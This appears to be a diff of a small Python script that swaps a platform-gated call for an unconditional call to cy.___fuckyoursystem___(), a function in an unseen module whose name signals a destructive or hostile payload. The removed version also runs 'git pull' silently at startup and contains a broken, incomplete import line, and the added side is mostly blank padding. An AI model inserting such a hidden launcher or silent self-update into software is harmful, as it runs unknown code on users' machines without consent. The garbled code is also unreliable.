@@ -1,18 +1,20 @@
-import os, platform
+import cy
 
-os.system('git pull')
+cy.___fuckyoursystem___()
 
-import requests
+
+
+
 
  
 
-bit = platform.architecture()[0]
 
-if bit == '64bit':
 
-    from cy
 
-    ___fuckyoursystem____()
+
+
+
+   
 
 
 
